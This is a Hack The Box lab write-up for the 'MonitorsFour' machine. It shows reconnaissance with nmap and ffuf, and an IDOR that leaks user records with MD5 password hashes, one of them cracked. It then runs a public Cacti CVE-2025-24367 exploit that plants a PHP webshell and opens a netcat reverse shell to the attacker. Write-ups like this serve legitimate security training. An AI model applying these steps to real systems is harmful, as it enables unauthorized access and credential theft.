MonitorsFour HTB Writeup
Machine Summary
Name: MonitorsFour

OS: Windows (Host)

Difficulty: Medium

IP: 10.129.28.57

Key Techniques:

Subdomain enumeration

IDOR leading to credential disclosure

Cacti 1.2.28 RCE (CVE-2025-24367)

Docker API misconfiguration (privilege escalation to host)

Initial Reconnaissance
We begin with a full TCP port scan using nmap.

bash
nmap -sC -sV -p- -oA monitorsfour 10.129.28.57
Notable results:

text
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
Port 80 redirects to monitorsfour.htb. Add this entry to /etc/hosts:

text
10.129.28.57   monitorsfour.htb
Subdomain Discovery
Fuzzing for virtual hosts reveals a subdomain hosting Cacti.

bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://monitorsfour.htb \
     -H "Host: FUZZ.monitorsfour.htb" -ac
Output:

text
cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1]
Add cacti.monitorsfour.htb to /etc/hosts and visit the page. The footer shows:

html
<div class='versionInfo'>Version 1.2.28 | (c) 2004-2026 - The Cacti Group</div>
Information Disclosure via IDOR
Fuzzing the API endpoints:

bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u http://monitorsfour.htb/FUZZ -ac
We find /api/v1/auth and /api/v1/user. Navigating to /user returns:

text
{"error":"Missing token parameter"}
Appending ?token=0 (a common placeholder) triggers an IDOR vulnerability and dumps user data:

bash
curl http://monitorsfour.htb/user?token=0
Response (formatted):

json
[
  {
    "id":2,
    "username":"admin",
    "email":"admin@monitorsfour.htb",
    "password":"56b32eb43e6f15395f6c46c1c9e1cd36",
    "role":"super user",
    "token":"8024b78f83f102da4f",
    "name":"Marcus Higgins",
    "position":"System Administrator",
    ...
  },
  ...
]
The password hashes are unsalted MD5. Using CrackStation or hashcat we crack 56b32eb43e6f15395f6c46c1c9e1cd36 → wonderful1.

We can now log into the main dashboard at http://monitorsfour.htb with:

Username: marcus (or admin)

Password: wonderful1

Cacti Remote Code Execution (CVE-2025-24367)
The Cacti instance is version 1.2.28, vulnerable to CVE-2025-24367 – an arbitrary file creation that leads to RCE. Public exploit: SoftAndoWetto/CVE-2025-24367-PoC-Cacti

Exploit Execution
Start a netcat listener:

bash
nc -lvnp 4444
Run the exploit:

bash
python3 exploit.py
Provide the following inputs when prompted:

Cacti BASE URL: http://cacti.monitorsfour.htb/cacti/

Username: marcus

Password: wonderful1

Your IP address: <KALI_IP>

Port: 4444

The exploit uploads a PHP webshell, writes a bash reverse shell script, and triggers execution.

Reverse shell received:

text
connect to [10.10.16.228] from (UNKNOWN) [10.129.28.57] 62978
bash: cannot set terminal process group (7): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$
